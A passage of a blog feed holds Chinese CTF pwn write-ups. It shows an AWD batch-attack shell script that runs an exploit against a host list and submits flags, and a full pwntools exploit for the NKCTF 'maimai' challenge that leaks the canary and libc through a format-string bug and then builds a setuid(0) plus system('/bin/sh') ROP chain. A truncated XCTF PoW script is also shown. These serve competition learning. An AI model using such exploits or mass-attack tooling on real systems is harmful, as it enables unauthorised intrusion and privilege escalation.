keyword">in</span> flags<span class="token punctuation">:</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>submit<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="attack-sh"><a href="#attack-sh" class="headerlink" title="attack.sh"></a>attack.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token assign-left variable">attack_times</span><span class="token operator">=</span><span class="token number">10000</span><span class="token assign-left variable">round_wait_time</span><span class="token operator">=</span><span class="token number">30</span> <span class="token comment">#half time</span><span class="token assign-left variable">wait_submit_time</span><span class="token operator">=</span><span class="token number">5</span><span class="token assign-left variable">log_file</span><span class="token operator">=</span><span class="token string">"logs"</span><span class="token assign-left variable">run_time</span><span class="token operator">=</span><span class="token number">120</span> <span class="token comment">#timeout</span><span class="token assign-left variable">next_attack_time</span><span class="token operator">=</span><span class="token number">2.5</span> <span class="token assign-left variable">max_concurrent_attacks</span><span class="token operator">=</span><span class="token number">10</span> <span class="token comment"># Max number of concurrent attacks</span><span class="token function-name function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">"+%H:%M:%S"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"[<span class="token variable">$t</span>]<span class="token variable">$1</span>"</span> <span class="token comment"># Fixed missing parameter usage</span>    <span class="token assign-left variable">info</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\033">\033</span>[43;37m <span class="token variable">$m</span> <span class="token entity" title="\033">\033</span>[0m"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$info</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$m</span>"</span> <span class="token operator">>></span> <span class="token variable">$log_file</span><span class="token punctuation">&#125;</span><span class="token function-name function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"-- round <span class="token variable">$1</span> -- "</span> <span class="token operator">>></span> all_flags    <span class="token function">cat</span> flags <span class="token operator">>></span> all_flags    <span class="token function">rm</span> flags    <span class="token builtin class-name">local</span> <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> hosts<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>        <span class="token function">timeout</span> <span class="token parameter variable">--foreground</span> <span class="token variable">$run_time</span> python3 ./exp.py <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">&amp;</span>        <span class="token function">sleep</span> <span class="token variable">$next_attack_time</span>        <span class="token variable"><span class="token punctuation">((</span>jobs<span class="token operator">++</span><span class="token punctuation">))</span></span>        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$jobs</span>"</span> <span class="token parameter variable">-ge</span> <span class="token string">"<span class="token variable">$max_concurrent_attacks</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>            <span class="token function">wait</span> <span class="token comment"># Wait for all background jobs to finish</span>            <span class="token assign-left variable">jobs</span><span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">fi</span>    <span class="token keyword">done</span>    <span class="token function">wait</span> <span class="token comment"># Ensure all attacks are complete before moving on</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting <span class="token variable">$wait_submit_time</span> s to submit flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$wait_submit_time</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Submitting flag<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    python3 ./submit_flag.py<span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> attack_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"-------- round <span class="token variable">$i</span> --------"</span>    log <span class="token string">"<span class="token variable">$m</span>"</span>    attack <span class="token variable">$i</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\x1b">\x1b</span>[47;30m Waiting next round<span class="token entity" title="\x1b">\x1b</span>[0m"</span>    <span class="token function">sleep</span> <span class="token variable">$round_wait_time</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="流量监控"><a href="#流量监控" class="headerlink" title="流量监控"></a>流量监控</h2><h3 id="pwn-waf"><a href="#pwn-waf" class="headerlink" title="pwn_waf"></a>pwn_waf</h3><p><a href="https://github.com/i0gan/pwn_waf/tree/main">https://github.com/i0gan/pwn_waf/tree/main</a></p><p>创建一个文件夹并赋一定权限，改<code>makefile</code>中的<code>log path</code>为该文件夹地址，<code>make</code>后将<code>pwn</code>和<code>catch</code>放到创建的文件夹中，再用<code>catch</code>替换<code>pwn</code>文件，此时<code>exp</code>打用<code>catch</code>替换的<code>pwn</code>文件即可在创建的文件夹中接收到流量</p><h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><ul><li>改<code>init_hosts.py</code>中的<code>ip</code>格式和<code>port</code></li><li>改<code>submit_flag.py</code>中的提交方式和<code>token</code></li><li>改<code>round_wait_time</code></li><li><code>patch</code></li><li>写<code>exp</code></li><li>批量攻击</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;准备长城杯的时候练习了两周&lt;code&gt;awd&lt;/code&gt;，注意力全放在&lt;code&gt;pwn&lt;/code&gt;了，可惜最后没有&lt;code&gt;pwn&lt;/code&gt;，全程坐牢去了…写一篇&lt;code&gt;awd&lt;/code&gt;的&lt;code&gt;pwn&lt;/code&gt;脚本和推荐工具吧，感谢&lt;a hre</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="awd" scheme="https://starrysky1004.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>2024NKCTF-maimai查分器</title>
    <link href="https://starrysky1004.github.io/2024/03/26/2024nkctf-maimai-cha-fen-qi/2024nkctf-maimai-cha-fen-qi/"/>
    <id>https://starrysky1004.github.io/2024/03/26/2024nkctf-maimai-cha-fen-qi/2024nkctf-maimai-cha-fen-qi/</id>
    <published>2024-03-25T16:38:12.000Z</published>
    <updated>2024-07-14T00:25:18.723Z</updated>
    
    <content type="html"><![CDATA[<p>格式化字符串+栈溢出+沙箱</p><p>保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$checksec</span> pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2024/nkctf/maimai/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>沙箱禁用了<code>open</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$seccomp</span>-tools dump ./pwn line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x05 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0007 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005 0004: 0x15 0x00 0x02 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0007 0005: 0x15 0x01 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0007 0006: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW 0007: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要通过功能<code>1</code>，得到一个大于<code>0x2da2</code>的值，功能<code>1</code>中<code>50</code>次输入一个浮点数和一个字符串，每个字符串对应一个整数，最终的值是每个浮点数和字符串对应的数值的乘积的和，这个随便试试差不多就出来了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_188C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">double</span> v1<span class="token punctuation">;</span> <span class="token comment">// xmm0_8</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">double</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">double</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+23h] [rbp-Dh] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input chart level and rank."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">49</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%lf %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">15.0</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v0 <span class="token operator">=</span> v3<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    v1 <span class="token operator">=</span> <span class="token function">sub_1633</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">=</span> v1 <span class="token operator">*</span> v5 <span class="token operator">+</span> v6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  dword_504C <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v6<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Calculation Done."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v8 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>功能<code>2</code>存在格式化字符串漏洞，由于<code>main</code>函数里是<code>while</code>循环，所以这个格式化字符串漏洞是可以多次被使用的，这个函数里调用了一个存在栈溢出漏洞的函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_19EA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input your nickname."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">", your rating is: %d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_504C<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_504C <span class="token operator">&lt;</span> dword_5010 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I think you should play more maimai."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_1984</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sub_1984</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Big God Coming!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Can you teach me how to play maimai?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v2 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于保护全开，所以要泄露<code>canary</code>和<code>libc</code>，直接<code>getshell</code>打远程会发现没有读<code>flag</code>的权限，这里有两种思路：</p><ul><li><code>openat</code>代替<code>open</code>读<code>flag</code></li><li><code>setuid(0)</code>提权</li></ul><p>我复现的时候用的第二种，第一种比较麻烦，需要再泄露栈地址并且在栈上构造<code>orw</code>，还存在读长度不够的问题，需要再调用一次<code>read</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node.nkctf.yuzhian.com.cn'</span><span class="token punctuation">,</span> <span class="token number">38179</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Select a option'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input chart level and rank'</span><span class="token punctuation">,</span> <span class="token string">b'1 S '</span> <span class="token operator">*</span> <span class="token number">49</span> <span class="token operator">+</span> <span class="token string">b'10000 S'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Select a option'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'nickname.'</span><span class="token punctuation">,</span> <span class="token string">b'%7$p%3$p'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc6_2.35-0ubuntu3.6_amd64/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1147e2</span>rdi <span class="token operator">=</span> <span class="token number">0x000000000002a3e5</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000029139</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basebin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>setuid <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setuid'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setuid<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Can you teach me how to play maimai?'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;格式化字符串+栈溢出+沙箱&lt;/p&gt;
&lt;p&gt;保护全开&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="栈溢出" scheme="https://starrysky1004.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="沙箱" scheme="https://starrysky1004.github.io/tags/%E6%B2%99%E7%AE%B1/"/>
    
    <category term="提权" scheme="https://starrysky1004.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="格式化字符串" scheme="https://starrysky1004.github.io/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>xctf-ggbond复现</title>
    <link href="https://starrysky1004.github.io/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/"/>
    <id>https://starrysky1004.github.io/2024/03/23/xctf-ggbond-fu-xian/xctf-ggbond-fu-xian/</id>
    <published>2024-03-22T17:34:04.000Z</published>
    <updated>2024-07-14T00:27:28.394Z</updated>
    
    <content type="html"><![CDATA[<p>题目是一点看不懂，网上找<code>wp</code>拼拼凑凑复现一下</p><p>题目给了一个<code>docker</code>和一个<code>pow.py</code>，加注释版<code>pow.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 导入所需的库</span><span class="token keyword">import</span> string<span class="token keyword">import</span> itertools<span class="token keyword">import</span> re<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment"># 用于网络连接和交互</span><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256  <span class="token comment"># 用于计算SHA-256哈希值</span><span class="token comment"># 目标服务器的IP地址和端口号（这里需要替换成实际的值）</span>remote_ip <span class="token operator">=</span> <span class="token string">''</span>remote_port <span class="token operator">=</span> <span class="token number">1337</span><span class="token comment"># 解决PoW挑战的函数</span><span class="token keyword">def</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 建立到远程服务器的连接</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>remote_ip<span class="token punctuation">,</span> remote_port<span class="token punctuation">)</span>    <span class="token comment"># 接收挑战字符串，直到遇到 ' == '，并解码成字符串格式</span>    rev <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' == '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 使用正则表达式从接收到的挑战中提取所需的字符串部分</span>    pattern <span class="token operator">=</span> <span class="token string">r'xxxx\+([a-zA-Z0-9]+)'</span>    rev <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> rev<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># 接收目标摘要值</span>    target_digest <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 定义字符集合，用于生成所有可能的4字符组合</span>    characters <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits    <span class="token comment"># 